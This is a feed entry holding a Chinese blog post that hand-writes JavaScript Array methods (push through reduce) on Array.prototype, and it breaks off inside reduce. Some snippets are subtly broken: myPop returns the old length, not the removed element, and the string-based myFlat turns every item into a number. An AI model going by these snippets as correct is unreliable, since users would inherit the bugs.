    <link href="http://llmysnow.top/posts/995105eb/"/>
    <id>http://llmysnow.top/posts/995105eb/</id>
    <published>2021-08-30T02:30:08.609Z</published>
    <updated>2021-08-30T02:30:08.609Z</updated>
    
    <content type="html"><![CDATA[<h2 id="数组基本操作方法"><a href="#数组基本操作方法" class="headerlink" title="数组基本操作方法"></a>数组基本操作方法</h2><blockquote><p>以下方法<strong>均改变原数组</strong>，需要操作数组的 length 属性</p></blockquote><h3 id="Push"><a href="#Push" class="headerlink" title="Push"></a>Push</h3><ul><li>返回值：新数组的长度</li><li>思路：数组的长度等于 <code>arguments[i]</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myPush = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>[<span class="built_in">this</span>.length] = <span class="built_in">arguments</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Pop"><a href="#Pop" class="headerlink" title="Pop"></a>Pop</h3><ul><li>返回值：删除的项（如果空数组，返回 undefined）</li><li>思路：让数组长度 -1</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myPop = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.length==<span class="number">0</span>?<span class="literal">undefined</span>:(<span class="built_in">this</span>[<span class="built_in">this</span>.length - <span class="number">1</span>],<span class="built_in">this</span>.length--);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Shift"><a href="#Shift" class="headerlink" title="Shift"></a>Shift</h3><ul><li>返回值：删除的项</li><li>思路：让数组前一个值 <code>this[i]</code> 等于后一个值 <code>this[i + 1]</code> ，之后把数组长度 -1</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myShift = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.length == <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">let</span> del = <span class="built_in">this</span>[<span class="number">0</span>];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>[i] = <span class="built_in">this</span>[i + <span class="number">1</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">this</span>.length--;</span><br><span class="line">    <span class="keyword">return</span> del;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="Unshift"><a href="#Unshift" class="headerlink" title="Unshift"></a>Unshift</h3><ul><li>返回值：新数组的长度</li><li>思路：让数组后一个值 <code>this[i]</code> 等于前 n（<code>n=arguments.length</code>）个值 <code>this[i - arguments.length]</code> ，之后把前 n 个值填为 <code>arguments[i]</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myUnshift = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">this</span>.length += <span class="built_in">arguments</span>.length;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="built_in">this</span>.length - <span class="number">1</span>; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (i &gt;= <span class="built_in">arguments</span>.length) &#123;</span><br><span class="line">            <span class="built_in">this</span>[i] = <span class="built_in">this</span>[i - <span class="built_in">arguments</span>.length];</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">this</span>[i] = <span class="built_in">arguments</span>[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>ES6 方法实现能简单一些。其实就是拼接数组，之后把拼接的数组一项一项赋值给原数组</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myUnshift = <span class="function"><span class="keyword">function</span> (<span class="params">...arg</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> newArr = [...arg, ...this];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; newArr.length; i++) &#123;</span><br><span class="line">        <span class="built_in">this</span>[i] = newArr[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.length;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数组操作方法"><a href="#数组操作方法" class="headerlink" title="数组操作方法"></a>数组操作方法</h2><blockquote><p>以下方法除splice（改变原数组）<strong>均不改变原数组</strong></p></blockquote><h3 id="splice（特殊）"><a href="#splice（特殊）" class="headerlink" title="splice（特殊）"></a>splice（特殊）</h3><blockquote><p>因为 push 实现比较简单，这里用到了 push 方法，能简写一两行</p></blockquote><ul><li><p>返回值：删除的项（数组）</p></li><li><p>思路：按参数数量分别进行判定</p><ul><li>参数小于等于1个，从 start 开始添加到新数组，并把添加那项删除（数组长度也减少）</li><li>参数大于1个，先进行删除（跟上一步相同）再把数组分成三份，左边+中间被替换的项+右边，合并数组</li></ul><p>注意：</p><ol><li>第一个参数为负数：如果转换为正数，大于数组长度，直接转换为0；小于等于数组长度，需加上数组长度</li><li>第二个参数：如果小于0，直接转换为0</li><li>第三个参数起：要添加的项</li></ol></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.mySplice = <span class="function"><span class="keyword">function</span> (<span class="params">start, del</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="keyword">if</span> (start &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        start = -start &gt; <span class="built_in">this</span>.length ? <span class="number">0</span> : <span class="built_in">this</span>.length + start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">arguments</span>.length &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = start; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">            arr.push(<span class="built_in">this</span>[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.length = start;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        del = del &lt; <span class="number">0</span> ? <span class="number">0</span> : del;</span><br><span class="line">        <span class="comment">// 删除数组这一步</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; del; i++) &#123;</span><br><span class="line">            arr.push(<span class="built_in">this</span>[start + i]);</span><br><span class="line">            <span class="built_in">this</span>[start + i] = <span class="built_in">this</span>[start + i + del];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">this</span>.length -= del;</span><br><span class="line">        <span class="keyword">let</span> lArr = [];</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; start; i++) &#123;</span><br><span class="line">            lArr.push(<span class="built_in">this</span>[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length - <span class="number">2</span>; i++) &#123;</span><br><span class="line">            lArr.push(<span class="built_in">arguments</span>[i + <span class="number">2</span>]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = start; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">            lArr.push(<span class="built_in">this</span>[i]);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; lArr.length; i++) &#123;</span><br><span class="line">            <span class="built_in">this</span>[i] = lArr[i];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><ul><li>删除数组那一步，我第一时间想到的是冒泡（把删除项一次一次冒到最后一位），最后出来的代码是下面这样（非常麻烦）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">let</span> that = del;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = that; i &gt; <span class="number">0</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (that &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> j = start; j &lt; <span class="built_in">this</span>.length - <span class="number">1</span>; j++) &#123;</span><br><span class="line">        [<span class="built_in">this</span>[j], <span class="built_in">this</span>[j + <span class="number">1</span>]] = [<span class="built_in">this</span>[j + <span class="number">1</span>], <span class="built_in">this</span>[j]];</span><br><span class="line">    &#125;</span><br><span class="line">    arr.push(<span class="built_in">this</span>[<span class="built_in">this</span>.length - <span class="number">1</span>]);</span><br><span class="line">    <span class="built_in">this</span>.length--;</span><br><span class="line">    that--;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>大可不必这样，把删除项的下一位（不删除）往前挪一个一个覆盖要删除的项即可</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; del; i++) &#123;</span><br><span class="line">    arr.push(<span class="built_in">this</span>[start + i]);</span><br><span class="line">    <span class="built_in">this</span>[start + i] = <span class="built_in">this</span>[start + i + del];</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">this</span>.length -= del;</span><br></pre></td></tr></table></figure><h3 id="concat"><a href="#concat" class="headerlink" title="concat"></a>concat</h3><ul><li>返回值：拼接后的新数组</li><li>思路：如果参数是数组需遍历后一个一个添加到新数组</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myConcat = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        arr[i] = <span class="built_in">this</span>[i];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">arguments</span>.length; i++) &#123;</span><br><span class="line">        <span class="keyword">const</span> el = <span class="built_in">arguments</span>[i];</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(el)) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; el.length; i++) &#123;</span><br><span class="line">                arr[arr.length] = el[i];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            arr[arr.length] = el;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="slice"><a href="#slice" class="headerlink" title="slice"></a>slice</h3><ul><li>返回值：复制后的新数组</li><li>思路：如果传参是负数索引，需对其长度进行判定。如果大于数组长度，将其改为0；小于数组长度，将其改为<code>arr.length+(负数索引)</code></li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.mySlice = <span class="function"><span class="keyword">function</span> (<span class="params">start = <span class="number">0</span>, end = <span class="built_in">this</span>.length</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">var</span> arr = [];</span><br><span class="line">    <span class="keyword">if</span> (start &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        start = -start &gt; <span class="built_in">this</span>.length ? <span class="number">0</span> : <span class="built_in">this</span>.length + start;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (end &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        end = -end &gt; <span class="built_in">this</span>.length ? <span class="number">0</span> : <span class="built_in">this</span>.length + end;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = start; i &lt; end; i++) &#123;</span><br><span class="line">        arr.push(<span class="built_in">this</span>[i]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="flat"><a href="#flat" class="headerlink" title="flat"></a>flat</h3><ul><li>返回值：扁平后的新数组</li><li>思路：递归（下面实现没有加上可以指定递归深度的参数，类似<code>arr.flat(Infinity)</code>）</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myFlat = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    fn(<span class="built_in">this</span>);</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">fn</span>(<span class="params">ary</span>) </span>&#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; ary.length; i++) &#123;</span><br><span class="line">            <span class="keyword">const</span> item = ary[i];</span><br><span class="line">            <span class="keyword">if</span> (<span class="built_in">Array</span>.isArray(item)) &#123;</span><br><span class="line">                fn(item);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                arr.push(item);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="built_in">Array</span>.prototype.myFlat = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>.toString().split(<span class="string">&quot;,&quot;</span>).map(<span class="function">(<span class="params">item</span>) =&gt;</span> <span class="built_in">Number</span>(item));</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数组重排方法"><a href="#数组重排方法" class="headerlink" title="数组重排方法"></a>数组重排方法</h2><h3 id="reverse"><a href="#reverse" class="headerlink" title="reverse"></a>reverse</h3><ul><li>返回值：倒序后的数组</li><li>思路：第n个数和倒数第n个数两两对换</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myReverse = <span class="function"><span class="keyword">function</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>, j = <span class="built_in">this</span>.length - <span class="number">1</span>; j &gt; i; i++, j--) &#123;</span><br><span class="line">        <span class="keyword">var</span> temp = <span class="built_in">this</span>[i];</span><br><span class="line">        <span class="built_in">this</span>[i] = <span class="built_in">this</span>[j];</span><br><span class="line">        <span class="built_in">this</span>[j] = temp;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="sort"><a href="#sort" class="headerlink" title="sort"></a>sort</h3><ul><li>返回值：排序后的数组</li><li>思路：不传参的时候，两两比较 String(xxx) 的值；传参的时候判断 <code>callBack(a-b)</code> 是否大于 0 即可</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.mySort = <span class="function"><span class="keyword">function</span> (<span class="params">callBack</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="built_in">this</span>.length &lt;= <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="keyword">typeof</span> callBack === <span class="string">&quot;function&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="built_in">this</span>.length - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (callBack(<span class="built_in">this</span>[j], <span class="built_in">this</span>[j + <span class="number">1</span>]) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">                    [<span class="built_in">this</span>[j], <span class="built_in">this</span>[j + <span class="number">1</span>]] = [<span class="built_in">this</span>[j + <span class="number">1</span>], <span class="built_in">this</span>[j]];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (<span class="keyword">typeof</span> callBack === <span class="string">&quot;undefined&quot;</span>) &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length - <span class="number">1</span>; i++) &#123;</span><br><span class="line">            <span class="keyword">for</span> (<span class="keyword">let</span> j = <span class="number">0</span>; j &lt; <span class="built_in">this</span>.length - <span class="number">1</span> - i; j++) &#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="built_in">String</span>(<span class="built_in">this</span>[j]) &gt; <span class="built_in">String</span>(<span class="built_in">this</span>[j + <span class="number">1</span>])) &#123;</span><br><span class="line">                    [<span class="built_in">this</span>[j], <span class="built_in">this</span>[j + <span class="number">1</span>]] = [<span class="built_in">this</span>[j + <span class="number">1</span>], <span class="built_in">this</span>[j]];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;参数异常&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">this</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数组位置方法"><a href="#数组位置方法" class="headerlink" title="数组位置方法"></a>数组位置方法</h2><blockquote><p>以下方法均<strong>不改变原数组</strong></p></blockquote><h3 id="indexOf"><a href="#indexOf" class="headerlink" title="indexOf"></a>indexOf</h3><ul><li>返回值：索引/-1</li><li>思路：遍历数组，第二个参数是从哪个索引开始。如果不传参，从头查到尾部</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myIndexOf = <span class="function"><span class="keyword">function</span> (<span class="params">val, index = <span class="number">0</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        index = -index &gt; <span class="built_in">this</span>.length ? <span class="number">0</span> : index + <span class="built_in">this</span>.length;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = index; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>[i] === val) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="lastIndexOf"><a href="#lastIndexOf" class="headerlink" title="lastIndexOf"></a>lastIndexOf</h3><ul><li>返回值：索引/-1</li><li>思路：遍历数组，第二个参数是到哪个索引结束（从0开始到这个索引结束）。如果不传参，从头查到尾部</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myLastIndexOf = <span class="function"><span class="keyword">function</span> (<span class="params">val, index = <span class="built_in">this</span>.length</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (index &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        index = -index &gt;= <span class="built_in">this</span>.length ? <span class="number">0</span> : index + <span class="built_in">this</span>.length;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = index; i &gt;= <span class="number">0</span>; i--) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>[i] === val) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> -<span class="number">1</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="includes"><a href="#includes" class="headerlink" title="includes"></a>includes</h3><ul><li>返回值：true/false</li><li>思路：遍历数组</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myIncludes = <span class="function"><span class="keyword">function</span> (<span class="params">val</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="built_in">this</span>[i] === val) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h2 id="数组迭代方法"><a href="#数组迭代方法" class="headerlink" title="数组迭代方法"></a>数组迭代方法</h2><blockquote><p>以下方法均<strong>不改变原数组</strong></p></blockquote><h3 id="forEach"><a href="#forEach" class="headerlink" title="forEach"></a>forEach</h3><blockquote><p>回调函数内部 this 一般指向 window</p></blockquote><ul><li>返回值：undefined</li><li>思路：遍历数组</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myForEach = <span class="function"><span class="keyword">function</span> (<span class="params">callBack</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> index = i, item = <span class="built_in">this</span>[i];</span><br><span class="line">        callBack(item, index);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="map"><a href="#map" class="headerlink" title="map"></a>map</h3><ul><li>返回值：映射后的新数组</li><li>思路：遍历数组，把数组每以项经过运算后赋值给新数组</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myMap = <span class="function"><span class="keyword">function</span> (<span class="params">callBack</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">let</span> arr = [];</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="built_in">this</span>.length; i++) &#123;</span><br><span class="line">        <span class="keyword">let</span> index = i, item = <span class="built_in">this</span>[i];</span><br><span class="line">        arr[i] = callBack(item, index);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> arr;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><h3 id="reduce"><a href="#reduce" class="headerlink" title="reduce"></a>reduce</h3><ul><li>返回值：函数累计处理的结果</li><li>思路：initial 返回值在数组的每次迭代中被记住，最后成为最终的结果值</li></ul><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Array</span>.prototype.myReduce = <span class="function"><span class="keyword">function</span> (<span class="params">callBack, initial</span>) 